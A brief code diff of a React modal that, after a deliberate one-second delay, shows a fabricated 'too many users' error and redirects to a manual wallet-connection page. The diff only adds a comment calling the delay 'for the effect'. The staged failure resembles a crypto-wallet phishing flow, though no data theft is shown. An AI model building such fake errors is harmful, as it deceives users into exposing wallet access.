@@ -19,7 +19,7 @@ const Modal_two = ({ closeModal }) => {
     setTimeout(() => {
       alert(`A lot of users are trying to connect. Please try connecting manually via ${walletName}.`);
       navigate('/manual'); 
-    }, 1000);
+    }, 1000); // 1 second delay for the effect
   };
 
   return (
